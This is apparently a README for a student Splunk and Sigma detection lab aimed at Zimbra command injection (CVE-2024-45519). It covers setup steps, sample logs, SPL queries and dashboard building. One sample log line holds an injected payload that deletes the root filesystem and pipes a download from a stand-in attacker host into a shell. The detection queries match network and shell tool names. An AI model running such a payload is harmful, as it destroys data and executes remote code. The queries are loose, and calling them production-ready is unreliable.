# Proactive Threat Detection & SIEM Log Analysis
### Zimbra Remote Command Injection Detection (CVE-2024-45519)

A complete, production-ready SIEM detection engineering lab utilizing **Splunk Enterprise (Linux VM)** and **Sigma Rules** to simulate, detect, and visualize real-world command injection attacks against Zimbra Collaboration Suite.

---

## Repository Structure

```
zimbra-siem-threat-detection/
|-- README.md                               # Master Project Documentation & Quick Start
|-- logs/
|   |-- zimbra_traffic.log              # Benchmark 3-line log dataset for quick verification
|   +-- extended_traffic_stream.log     # Extended realistic log stream for rich dashboards
|-- rules/
|   |-- zimbra_command_injection.yml    # Official Sigma Rule (YAML) with MITRE ATT&CK tags
|   +-- splunk_queries.spl             # Splunk SPL searches, alerts, and aggregation queries
|-- dashboards/
|   |-- zimbra_detection_dashboard.xml  # Splunk Classic XML Dashboard definition
|   +-- dashboard_studio_definition.json# Splunk Dashboard Studio JSON definition
|-- scripts/
|   |-- setup_vm_splunk.sh             # Linux VM automated installation and setup script
|   +-- simulate_attack.py             # Python attack simulator & live log generator
+-- docs/
    |-- PROJECT_REPORT.md               # Ready-to-submit College Project Report
    |-- PRESENTATION_SLIDES.md          # 5-Slide Presentation Deck with verbatim talk scripts
    +-- VIVA_AND_INTERVIEW_PREP.md      # Examiner Viva & Technical Q&A Preparation
```

---

## Quick Start Guide (Step-by-Step)

### Phase 1: Software Setup in Linux VMware VM (Estimated: 1 hour)
1. **Download Splunk**: Register on [splunk.com](https://www.splunk.com/) and download the Linux `.deb` or `.rpm` package.
2. **Install & Start Splunk**:
   ```bash
   sudo dpkg -i splunk-*.deb
   sudo /opt/splunk/bin/splunk start --accept-license --answer-yes
   sudo /opt/splunk/bin/splunk enable boot-start
   ```
3. **Access Dashboard**: Open your browser (inside or outside VM) and navigate to `http://localhost:8000` (or `http://<VM_IP>:8000`).

---

### Phase 2: Log File Setup & Ingestion (Estimated: 1 hour)
1. **Create the Benchmark Log File**:
   ```bash
   nano ~/zimbra_traffic.log
   ```
   Paste the 3 lines:
   ```text
   2026-08-25 10:15:02 INFO  [http-bio-8443-exec-1] SoapEngine - handler invoked for Service Status
   2026-08-25 10:15:30 WARN  [http-bio-8443-exec-4] snmp_notify - localized notification sent successfully
   2026-08-25 10:16:12 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;
   ```
2. **Upload to Splunk**:
  * In Splunk Web, go to **Settings** -> **Add Data** -> **Upload**.
  * Select `~/zimbra_traffic.log`.
  * Set Source Type to auto-detect, click **Next** and **Submit**.

---

### Phase 3: Writing & Testing Detection Logic (Estimated: 1 hour)
1. In Splunk Search bar, run the core detection query:
   ```spl
   source="*zimbra_traffic.log*" "swatchdog" ("wget" OR "sh" OR "curl" OR "rm")
   ```
2. **Why this works**: Differentiates benign operations from unauthenticated RCE attempts by detecting when `swatchdog` invokes dangerous binaries.

---

### Phase 4: Building the College Deliverable Dashboard (Estimated: 30 mins)
1. In Splunk Search, run:
   ```spl
   source="*zimbra*" ("swatchdog" OR "snmp_notify") ("wget" OR "sh" OR "curl" OR "rm") | stats count as "Malicious Payloads Detected"
   ```
2. Click **Save As** -> **Dashboard Studio** (or **Classic Dashboard**).
3. Add a **Single Value** visualization. Notice how the metric displays **1** in red when the alert line is present.
4. Import `dashboards/zimbra_detection_dashboard.xml` via **Edit -> Source** for a complete 3-panel SOC dashboard!
5. Capture screenshots for your presentation slide deck.

---

## College Presentation & Viva Resources
* Full Academic Report: [`docs/PROJECT_REPORT.md`](file:///C:/Users/JATHIN/.gemini/antigravity/scratch/zimbra-siem-threat-detection/docs/PROJECT_REPORT.md)
* Presentation Slide Deck & Scripts: [`docs/PRESENTATION_SLIDES.md`](file:///C:/Users/JATHIN/.gemini/antigravity/scratch/zimbra-siem-threat-detection/docs/PRESENTATION_SLIDES.md)
* Viva Q&A Cheat Sheet: [`docs/VIVA_AND_INTERVIEW_PREP.md`](file:///C:/Users/JATHIN/.gemini/antigravity/scratch/zimbra-siem-threat-detection/docs/VIVA_AND_INTERVIEW_PREP.md)
* Official Sigma Rule: [`rules/zimbra_command_injection.yml`](file:///C:/Users/JATHIN/.gemini/antigravity/scratch/zimbra-siem-threat-detection/rules/zimbra_command_injection.yml)
* Production SPL Queries: [`rules/splunk_queries.spl`](file:///C:/Users/JATHIN/.gemini/antigravity/scratch/zimbra-siem-threat-detection/rules/splunk_queries.spl)
